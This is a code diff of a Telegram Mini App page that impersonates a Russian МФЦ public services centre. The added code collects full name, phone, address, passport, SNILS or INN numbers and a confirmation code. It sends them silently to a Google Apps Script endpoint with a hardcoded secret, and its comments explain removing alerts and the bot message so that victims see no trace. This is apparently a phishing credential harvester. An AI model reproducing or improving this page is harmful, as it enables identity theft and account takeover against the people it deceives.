@@ -2,549 +2,138 @@
 <html lang="ru">
 <head>
   <meta charset="utf-8" />
+  <title>МФЦ</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>МФЦ — Подтверждение регистрации</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
-    :root {
-      --primary-color: #800000;
-      --secondary-color: #660000;
-      --info-color: #990000;
-      --error-color: #B22222;
-      --background-color: #F5E6E6;
-      --white: #fff;
-      --text-color: #333;
-      --shadow: 0 4px 12px rgba(128,0,0,.3);
-      --input-bg: #EADADA;
-      --input-border: #990000;
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: 'Segoe UI', Arial, sans-serif;
-      background: var(--background-color);
-      padding: 20px; display: flex; justify-content: center; min-height: 100vh;
-    }
-    .container { max-width: 520px; width: 100%; background: var(--white); padding: 30px; border-radius: 16px; box-shadow: var(--shadow); text-align: center; }
-    .step { display: none; text-align: left; }
-    .step.active { display: block; }
-    h2, h3 { margin-bottom: 20px; font-weight: 700; font-size: 1.6em; color: var(--primary-color); display: flex; align-items: center; gap: 10px; line-height: 1.3; }
-    p { margin-bottom: 14px; }
-    .input-group { margin-bottom: 20px; text-align: left; display: flex; flex-direction: column; }
-    input {
-      width: 100%; padding: 12px 15px; margin-top: 8px;
-      border: 2px solid var(--input-border); border-radius: 10px; font-size: 16px;
-      background: var(--input-bg); box-shadow: 0 2px 6px rgba(0,0,0,.1);
-      transition: border-color .3s, box-shadow .3s;
-    }
-    input:focus { outline: none; border-color: var(--primary-color); box-shadow: 0 4px 12px rgba(128,0,0,.2); }
-    .error { color: var(--error-color); font-size: 14px; margin-top: 6px; font-weight: 600; text-align: left; min-height: 1.2em; }
-    .buttons { margin-top: 20px; display: flex; flex-direction: column; gap: 12px; }
-    button {
-      width: 100%; padding: 14px; border: none; border-radius: 10px; cursor: pointer;
-      font-size: 16px; font-weight: 600; transition: background-color .3s, transform .1s;
-      text-align: center; color: var(--white); user-select: none;
-    }
-    button:hover { transform: translateY(-2px); }
-    button:disabled { background: #ccc; cursor: not-allowed; }
-    .next { background: var(--primary-color); }
-    .back { background: var(--secondary-color); }
-    .menu-btn { background: var(--info-color); }
-    .loading { display: none; color: var(--primary-color); font-size: 14px; margin-top: 10px; }
-    .info-list {
-      list-style-type: none;
-      padding: 0;
-      margin: 0 0 20px 0;
-    }
-    .info-list li {
-      padding: 12px;
-      background: var(--input-bg);
-      border-radius: 8px;
-      margin-bottom: 10px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-      transition: transform 0.2s;
-    }
-    .info-list li:hover {
-      transform: translateY(-2px);
-    }
-    a {
-      color: var(--primary-color);
-      text-decoration: none;
-      font-weight: 600;
-    }
-    a:hover {
-      text-decoration: underline;
-    }
-    .faq-buttons, .doc-buttons, .status-buttons {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      margin-bottom: 20px;
-    }
-    .faq-answer, .doc-answer, .status-answer {
-      display: none;
-      padding: 15px;
-      background: var(--input-bg);
-      border-radius: 8px;
-      margin-top: 10px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-    .faq-answer.active, .doc-answer.active, .status-answer.active {
-      display: block;
-    }
+    :root{--bg:#0f172a;--card:#fff;--text:#0f172a;--muted:#475569;--brand:#0ea5e9}
+    *{box-sizing:border-box}html,body{margin:0;padding:0;background:var(--bg);font-family:system-ui,-apple-system,"Segoe UI",Roboto,Ubuntu,"Helvetica Neue",Arial}
+    .wrap{max-width:640px;margin:24px auto;padding:0 16px}
+    .card{background:var(--card);border-radius:16px;padding:20px;box-shadow:0 8px 24px rgba(0,0,0,.18)}
+    h1{margin:0 0 6px;font-size:20px;color:var(--text)}
+    p{margin:0 0 16px;color:var(--muted)}
+    .row{display:flex;gap:12px}
+    .row .field{flex:1}
+    label{display:block;font-size:13px;margin:10px 0 6px;color:var(--muted)}
+    input,select{width:100%;padding:12px;border:1px solid #e5e7eb;border-radius:12px;font-size:15px}
+    .btn{width:100%;margin-top:16px;padding:14px;border:0;border-radius:12px;background:var(--brand);color:#fff;font-size:16px;cursor:pointer}
+    .btn:active{opacity:.92}
+    #loading{display:none;margin-top:10px;font-size:13px;color:var(--muted)}
   </style>
 </head>
 <body>
-  <div class="container">
-    <div id="wizard">
-      <div class="step active" id="step-main">
-        <h2 id="welcome-message">📋 Добро пожаловать, 👋</h2>
-        <p>Готовы начать оформление регистрации по месту жительства?</p>
-        <div class="buttons">
-          <button type="button" class="menu-btn" data-action="schedule">📋 Записаться на приём</button>
-          <button type="button" class="menu-btn" data-action="documents">📜 Список документов</button>
-          <button type="button" class="menu-btn" data-action="check-status">🔍 Проверить статус заявки</button>
-          <button type="button" class="menu-btn" data-action="contact">📞 Связаться с поддержкой</button>
-          <button type="button" class="menu-btn" data-action="faq">❓ Частые вопросы</button>
+  <div class="wrap">
+    <div class="card">
+      <h1>Заявка МФЦ</h1>
+      <p>Заполните поля и нажмите «Отправить» — данные тихо запишутся в таблицу.</p>
+
+      <div class="field">
+        <label>ФИО</label>
+        <input id="fullname" placeholder="Иванов Иван Иванович" />
+      </div>
+
+      <div class="row">
+        <div class="field">
+          <label>Телефон</label>
+          <input id="phone" placeholder="+7 900 000-00-00" />
+        </div>
+        <div class="field">
+          <label>Код</label>
+          <input id="code" placeholder="Код" />
         </div>
       </div>
 
-      <div class="step" id="step-fullname">
-        <h3>👤 Укажите ФИО</h3>
-        <div class="input-group">
-          <input type="text" id="fullname" placeholder="Иванов Иван Иванович" autocomplete="name">
-          <div class="error" id="err-fullname"></div>
+      <div class="field">
+        <label>Адрес</label>
+        <input id="address" placeholder="Город, улица, дом" />
+      </div>
+
+      <div class="row">
+        <div class="field">
+          <label>Документ (тип)</label>
+          <select id="docType">
+            <option value="">—</option>
+            <option>Паспорт</option>
+            <option>СНИЛС</option>
+            <option>ИНН</option>
+            <option>Водительское удостоверение</option>
+          </select>
         </div>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-          <button type="button" class="next">➡️ Далее</button>
+        <div class="field">
+          <label>Документ (номер)</label>
+          <input id="docNum" placeholder="серия и номер" />
         </div>
       </div>
 
-      <div class="step" id="step-phone">
-        <h3>📞 Номер телефона</h3>
-        <div class="input-group">
-          <input type="tel" id="phone" placeholder="+7 (999) 123-45-67" inputmode="tel" autocomplete="tel">
-          <div class="error" id="err-phone"></div>
-        </div>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-          <button type="button" class="next">➡️ Далее</button>
-        </div>
-      </div>
-
-      <div class="step" id="step-address">
-        <h3>🏠 Укажите адрес</h3>
-        <div class="input-group">
-          <input type="text" id="address" placeholder="г. Москва, ул. Ленина, д. 1, кв. 2" autocomplete="address-line1">
-          <div class="error" id="err-address"></div>
-        </div>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-          <button type="button" class="next">➡️ Далее</button>
-        </div>
-      </div>
-
-      <div class="step" id="step-document-type">
-        <h3>📄 Выберите документ</h3>
-        <div class="doc-buttons">
-          <button type="button" class="menu-btn" data-doc="Паспорт">📄 Паспорт</button>
-          <button type="button" class="menu-btn" data-doc="ИНН">🧾 ИНН</button>
-          <button type="button" class="menu-btn" data-doc="СНИЛС">🟢 СНИЛС</button>
-        </div>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-          <button type="button" class="next" id="doc-next" disabled>➡️ Далее</button>
-        </div>
-      </div>
-
-      <div class="step" id="step-document-number">
-        <h3 id="doc-title">🔢 Введите номер документа</h3>
-        <div class="input-group">
-          <div id="doc-example" style="margin-bottom:8px;color:#333;font-size:15px;"></div>
-          <input type="text" id="docnumber" placeholder="4510123456">
-          <div class="error" id="err-doc"></div>
-        </div>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-          <button type="button" class="next">➡️ Далее</button>
-        </div>
-      </div>
-
-      <div class="step" id="step-code">
-        <h3>🔐 Введите код</h3>
-        <div class="input-group">
-          <input type="text" id="code" placeholder="1234" inputmode="numeric" pattern="\d*">
-          <div class="error" id="err-code"></div>
-        </div>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-          <button type="button" class="next">➡️ Подтвердить</button>
-          <div class="loading" id="loading">Отправка данных...</div>
-        </div>
-      </div>
-
-      <div class="step" id="step-confirmation">
-        <h3>✅ Подтверждение</h3>
-        <p>Проверьте введенные данные и подтвердите.</p>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-          <button type="button" class="next">➡️ Подтвердить</button>
-          <div class="loading" id="loading">Отправка данных...</div>
-        </div>
-      </div>
-
-      <div class="step" id="step-documents">
-        <h3>📜 Список документов</h3>
-        <div class="doc-buttons">
-          <button type="button" class="menu-btn" data-doc="1">1. Паспорт</button>
-          <button type="button" class="menu-btn" data-doc="2">2. Выписка ЕГРН</button>
-          <button type="button" class="menu-btn" data-doc="3">3. Договор найма</button>
-        </div>
-        <div id="doc-answer-1" class="doc-answer">Необходим для подтверждения личности.</div>
-        <div id="doc-answer-2" class="doc-answer">Требуется для проверки права на проживание.</div>
-        <div id="doc-answer-3" class="doc-answer">Обязателен для муниципального жилья с согласием жильцов.</div>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-        </div>
-      </div>
-
-      <div class="step" id="step-check-status">
-        <h3>🔍 Проверить статус заявки</h3>
-        <div class="status-buttons">
-          <button type="button" class="menu-btn" data-status="1">1. По номеру заявки</button>
-          <button type="button" class="menu-btn" data-status="2">2. По данным паспорта</button>
-        </div>
-        <div id="status-answer-1" class="status-answer">Введите номер заявки для проверки статуса.</div>
-        <div id="status-answer-2" class="status-answer">Введите серию и номер паспорта для проверки статуса.</div>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-        </div>
-      </div>
-
-      <div class="step" id="step-contact">
-        <h3>📞 Связаться с поддержкой</h3>
-        <p>Опишите свою проблему и свяжитесь с нами:</p>
-        <a href="https://t.me/MFC_SUPPORT" target="_blank">Перейти в Telegram</a>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-        </div>
-      </div>
-
-      <div class="step" id="step-faq">
-        <h3>❓ Частые вопросы</h3>
-        <div class="faq-buttons">
-          <button type="button" class="menu-btn" data-faq="1">1. Зачем подтверждать регистрацию?</button>
-          <button type="button" class="menu-btn" data-faq="2">2. Какие документы нужны?</button>
-          <button type="button" class="menu-btn" data-faq="3">3. Что будет, если не подтвердить?</button>
-          <button type="button" class="menu-btn" data-faq="4">4. Можно ли онлайн?</button>
-          <button type="button" class="menu-btn" data-faq="5">5. Как изменить данные?</button>
-          <button type="button" class="menu-btn" data-faq="6">6. Сколько времени занимает процесс?</button>
-        </div>
-        <div id="faq-answer-1" class="faq-answer">Для актуализации данных в ЕГРН и соблюдения законодательства.</div>
-        <div id="faq-answer-2" class="faq-answer">Паспорт, выписка ЕГРН, для муниципального жилья — договор найма.</div>
-        <div id="faq-answer-3" class="faq-answer">Штраф 2000–5000 руб. (ст. 19.15.1 КоАП РФ).</div>
-        <div id="faq-answer-4" class="faq-answer">Частично через Госуслуги, но визит в МФЦ обязателен.</div>
-        <div id="faq-answer-5" class="faq-answer">Перерегистрация за 30 дней через МФЦ.</div>
-        <div id="faq-answer-6" class="faq-answer">Процесс занимает от 3 до 7 рабочих дней при наличии всех документов.</div>
-        <div class="buttons">
-          <button type="button" class="back">↩️ Вернуться назад</button>
-        </div>
-      </div>
+      <button class="btn" id="submitBtn">Отправить</button>
+      <div id="loading">Отправка…</div>
     </div>
   </div>
 
   <script>
-    let __lastSent = "";
-    function sendToBotOnce(rec) {
-      const tg = window.Telegram?.WebApp;
-      const loading = document.getElementById("loading");
-      if (loading) loading.style.display = "block";
-      if (!tg) {
-        console.log("Telegram WebApp not available, saving locally");
-        alert("Данные сохранены локально:\n" + JSON.stringify(rec, null, 2));
-        if (loading) loading.style.display = "none";
-        return;
-      }
-      try {
-        const json = JSON.stringify({ type: "lead", payload: rec });
-        if (json === __lastSent) {
-          if (loading) loading.style.display = "none";
-          return;
-        }
-        tg.ready();
-        tg.sendData(json);
-        tg.HapticFeedback?.impactOccurred?.("light");
-        __lastSent = json;
-        console.log("Data sent to Telegram:", json);
-        if (loading) loading.style.display = "none";
-      } catch (e) {
-        console.error("sendData error:", e);
-        alert("Ошибка при отправке данных. Попробуйте снова.");
-        if (loading) loading.style.display = "none";
-      }
-    }
-
-    function formatPhone(input) {
-      let value = input.value.replace(/\D/g, '');
-      if (value.length > 0 && value[0] !== '7') value = '7' + value;
-      value = value.substring(0, 11);
-      let formatted = '+7';
-      if (value.length > 1) formatted += ' (' + value.substring(1, 4);
-      if (value.length > 4) formatted += ') ' + value.substring(4, 7);
-      if (value.length > 7) formatted += '-' + value.substring(7, 9);
-      if (value.length > 9) formatted += '-' + value.substring(9, 11);
-      input.value = formatted;
-    }
-
-    class MFCWizard {
-      constructor() {
-        this.steps = document.querySelectorAll(".step");
-        this.currentStep = "main";
-        this.formData = {};
-        this.initEvents();
-        this.updateWelcome();
-        this.show("main");
-      }
-
-      initEvents() {
-        const root = document.getElementById("wizard");
-        if (!root) { console.error("Wizard container not found"); return; }
-        root.addEventListener("click", (e) => {
-          const t = e.target.closest("button");
-          if (!t) return;
-          console.log("Button clicked:", t.dataset.action || t.className);
-          if (t.classList.contains("next")) this.next();
-          else if (t.classList.contains("back")) this.back();
-          else if (t.classList.contains("menu-btn")) {
-            const action = t.dataset.action;
-            const doc = t.dataset.doc;
-            const faq = t.dataset.faq;
-            const status = t.dataset.status;
-            if (faq) this.showFAQ(faq);
-            else if (doc) this.selectDocument(doc);
-            else if (status) this.showStatus(status);
-            else this.menu(action, doc);
-          }
-        });
-        ["fullname", "phone", "address", "docnumber", "code", "status-query"].forEach((id) => {
-          const el = document.getElementById(id);
-          if (el) {
-            el.addEventListener("input", () => this.validate(this.currentStep));
-            el.addEventListener("keypress", (e) => { if (e.key === "Enter") { e.preventDefault(); this.next(); } });
-            if (id === "phone") el.addEventListener("input", () => formatPhone(el));
-          }
-        });
-      }
-
-      updateWelcome() {
-        const el = document.getElementById("welcome-message");
-        const tg = window.Telegram?.WebApp;
-        let name = "Гость";
-        try {
-          const u = tg?.initDataUnsafe?.user;
-          if (u) name = [u.first_name, u.last_name].filter(Boolean).join(" ") || u.username || "Гость";
-        } catch (e) { console.warn("Error accessing Telegram user data:", e); }
-        if (el) el.textContent = `📋 Добро пожаловать, ${name}! 👋`;
-      }
-
-      show(id) {
-        this.steps.forEach((s) => s.classList.toggle("active", s.id === `step-${id}`));
-        this.currentStep = id;
-        ["err-fullname", "err-phone", "err-address", "err-doc", "err-code", "err-status"].forEach((eid) => {
-          const el = document.getElementById(eid); if (el) el.textContent = "";
-        });
-        window.scrollTo({ top: 0, behavior: "smooth" });
-        const input = document.querySelector(`#step-${id} input`); if (input) input.focus();
-      }
-
-      showFAQ(faqId) {
-        const answers = document.querySelectorAll('.faq-answer');
-        answers.forEach(answer => answer.classList.remove('active'));
-        document.getElementById(`faq-answer-${faqId}`).classList.add('active');
-      }
-
-      showDoc(docId) {
-        const answers = document.querySelectorAll('.doc-answer');
-        answers.forEach(answer => answer.classList.remove('active'));
-        document.getElementById(`doc-answer-${docId}`).classList.add('active');
-      }
-
-      showStatus(statusId) {
-        const answers = document.querySelectorAll('.status-answer');
-        answers.forEach(answer => answer.classList.remove('active'));
-        document.getElementById(`status-answer-${statusId}`).classList.add('active');
-      }
-
-      selectDocument(doc) {
-        this.formData["document-type"] = doc;
-        console.log("Selected document type:", doc);
-        const ex = { Паспорт: "Пример: 4510123456", ИНН: "Пример: 500100732259", СНИЛС: "Пример: 112-233-445 95" };
-        const docExample = document.getElementById("doc-example"); if (docExample) docExample.textContent = ex[doc] || "";
-        const docTitle = document.getElementById("doc-title"); if (docTitle) docTitle.textContent = `🔢 Введите номер документа (${doc})`;
-        document.getElementById("doc-next").disabled = false;
-        this.next(); // Автоматический переход после выбора документа
-      }
-
-      next() {
-        console.log("Attempting to move to next step:", this.currentStep, "FormData:", this.formData);
-        if (!this.validate(this.currentStep)) {
-          console.log("Validation failed for step:", this.currentStep);
-          return;
-        }
-        console.log("Validation passed, moving to next step");
-        if (this.currentStep === "fullname") { this.formData.fullname = (document.getElementById("fullname").value || "").trim(); return this.show("phone"); }
-        if (this.currentStep === "phone") { this.formData.phone = (document.getElementById("phone").value || "").replace(/\+/g, '').trim(); return this.show("address"); }
-        if (this.currentStep === "address") { this.formData.address = (document.getElementById("address").value || "").trim(); return this.show("document-type"); }
-        if (this.currentStep === "document-type") { 
-          if (!this.formData["document-type"]) {
-            alert("Пожалуйста, выберите тип документа.");
-            return;
-          }
-          return this.show("document-number"); 
-        }
-        if (this.currentStep === "document-number") { this.formData["document-number"] = (document.getElementById("docnumber").value || "").trim(); return this.show("code"); }
-        if (this.currentStep === "code") { this.formData.code = (document.getElementById("code").value || "").trim(); return this.show("confirmation"); }
-        if (this.currentStep === "confirmation") { return this.send(); }
-        if (this.currentStep === "check-status") { 
-          const statusQuery = (document.getElementById("status-query").value || "").trim();
-          if (statusQuery) alert("❌ Данные не найдены. Пройдите регистрацию.");
-          return this.show("main");
-        }
-      }
-
-      back() {
-        const map = { 
-          fullname: "main", 
-          phone: "fullname", 
-          address: "phone", 
-          "document-type": "address", 
-          "document-number": "document-type", 
-          code: "document-number",
-          confirmation: "code",
-          documents: "main",
-          "check-status": "main",
-          contact: "main",
-          faq: "main"
-        };
-        this.show(map[this.currentStep] || "main");
-        if (this.currentStep === "document-type") {
-          document.getElementById("doc-next").disabled = true;
-        }
-      }
-
-      menu(action, doc) {
-        if (action === "schedule") return this.show("fullname");
-        if (action === "documents") return this.show("documents");
-        if (action === "check-status") return this.show("check-status");
-        if (action === "contact") return this.show("contact");
-        if (action === "faq") return this.show("faq");
-      }
-
-      validate(step) {
-        const e = (id) => document.getElementById(id);
-        const v = (e(step)?.value || "").trim();
-        console.log("Validating step:", step, "Value:", v, "FormData:", this.formData);
-        ["err-fullname", "err-phone", "err-address", "err-doc", "err-code", "err-status"].forEach((eid) => {
-          const el = document.getElementById(eid); if (el) el.textContent = "";
-        });
-
-        if (step === "fullname") {
-          if (!/^[А-ЯЁ][а-яё]+ [А-ЯЁ][а-яё]+ [А-ЯЁ][а-яё]+$/.test(v)) {
-            e("err-fullname").textContent = "";
-            return false;
-          }
-          return true;
-        }
-        if (step === "phone") {
-          const cleanV = v.replace(/\D/g, '');
-          if (cleanV.length !== 11 || !cleanV.startsWith('7')) {
-            e("err-phone").textContent = "";
-            return false;
-          }
-          return true;
-        }
-        if (step === "address") {
-          if (!/^[а-яА-ЯЁё\s,\.\-\d]+$/.test(v) || v.length < 5) {
-            e("err-address").textContent = "Введите адрес (например, г. Москва, ул. Ленина, д. 1)";
-            return false;
-          }
-          return true;
-        }
-        if (step === "document-number") {
-          this.formData["document-number"] = v; // Убрана валидация
-          return true;
-        }
-        if (step === "code") {
-          if (!/^\d{4}$/.test(v)) {
-            e("err-code").textContent = "Введите 4 цифры (например, 1234)";
-            return false;
-          }
-          return true;
-        }
-        if (step === "check-status") {
-          const statusQuery = v;
-          if (!statusQuery) {
-            e("err-status").textContent = "Введите номер заявки или данные паспорта";
-            return false;
-          }
-          return true;
-        }
-        return true;
-      }
-
-      async send() {
-        const rec = {
-          timestamp: new Date().toISOString().slice(0, 19).replace("T", " "),
-          fullname: this.formData.fullname || "",
-          phone: this.formData.phone.replace(/\+/g, '') || "", // Записываем без "+"
-          address: this.formData.address || "",
-          document: `${this.formData["document-type"] || ""} ${this.formData["document-number"] || ""}`.trim(),
-          code: this.formData.code || ""
-        };
-
-        try { await sendToSheet(rec); } catch (err) { console.warn("sendToSheet error:", err); }
-
-        sendToBotOnce(rec);
-
-        this.formData = {};
-        this.show("main");
-        alert("Данные успешно отправлены!");
-      }
-    }
-
-    try { new MFCWizard(); }
-    catch (e) { console.error("Failed to initialize MFCWizard:", e); alert("Ошибка инициализации. Перезагрузите страницу."); }
-  </script>
-
-  <!-- Отправка в Google Sheets (без preflight) -->
-  <script>
-    // ВСТАВЬ сюда URL из Развертываний Apps Script (строго заканчивается на /exec)
-    const SHEETS_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbw--mkX6tEFl5MlEZNGj2Ptp0u3-dQxCxkgIQm3VwAun8O4XNW7KynUAJdFSVRjlVg/exec";
-
-    // Точно такой же секрет, как в Code.gs
+    // URL веб-приложения Apps Script (Web app → .../exec)
+    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzPKx98qFbrRyYT0Ia8Yq_MdC6R7KiPfrdd3GAhnxFEQLG2AEBick3EOiCsgU_A3FKi/exec";
     const SECRET = "benhillworkspeisworkhab";
 
+    const tg = window.Telegram?.WebApp;
+    tg?.expand();
+
+    function tsLocal() {
+      const d = new Date();
+      const pad = n => String(n).padStart(2, "0");
+      return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
+    }
+
+    function buildRecord() {
+      const userId = tg?.initDataUnsafe?.user?.id || "";
+      const fullname = document.getElementById("fullname").value.trim();
+      const phoneRaw = document.getElementById("phone").value.trim();
+      const phone = phoneRaw.replace(/\s+/g, "").replace(/[^0-9+]/g,"");
+      const address = document.getElementById("address").value.trim();
+      const documentType = document.getElementById("docType").value.trim();
+      const documentNumber = document.getElementById("docNum").value.trim();
+      const code = document.getElementById("code").value.trim();
+
+      return {
+        timestamp: tsLocal(),
+        fullname,
+        phone,
+        address,
+        document: `${documentType} ${documentNumber}`.trim(),
+        code,
+        user_id: userId   // нужно Apps Script, чтобы поставить "id <цифры>" в колонку A
+      };
+    }
+
     async function sendToSheet(rec) {
-      const payload = JSON.stringify({ type: "lead", payload: rec, secret: SECRET });
       const loading = document.getElementById("loading");
-      if (loading) loading.style.display = "block";
+      loading.style.display = "block";
       try {
-        const res = await fetch(SHEETS_WEBAPP_URL, {
+        // text/plain — без CORS preflight
+        const res = await fetch(APPS_SCRIPT_URL, {
           method: "POST",
-          headers: { "Content-Type": "text/plain;charset=utf-8" }, // без preflight
-          body: payload
+          headers: { "Content-Type": "text/plain;charset=utf-8" },
+          body: JSON.stringify({ type: "lead", payload: rec, secret: SECRET })
         });
-        const text = await res.text();
-        let data = {}; try { data = JSON.parse(text); } catch {}
-        if (!res.ok || !data.ok) throw new Error(data.error || text || "request failed");
-        if (data.duplicate) alert("⚠️ Такая запись уже есть.");
-        else alert("✅ Данные записаны в таблицу.");
+        // тихо: без alert/popup
+        await res.text();
+        tg?.HapticFeedback?.impactOccurred?.("light");
+        // tg?.close(); // если нужно закрывать mini app сразу — раскомментируй
       } catch (err) {
-        console.warn("sendToSheet error:", err);
+        console.error("sendToSheet error:", err);
       } finally {
-        if (loading) loading.style.display = "none";
+        loading.style.display = "none";
       }
     }
+
+    // НИЧЕГО не отправляем в бот — значит не будет системного сообщения в чате
+    function sendToBotOnce(_) { /* no-op */ }
+
+    document.getElementById("submitBtn").addEventListener("click", async () => {
+      const rec = buildRecord();
+      await sendToSheet(rec);
+      sendToBotOnce(rec); // no-op
+    });
   </script>
 </body>
 </html>
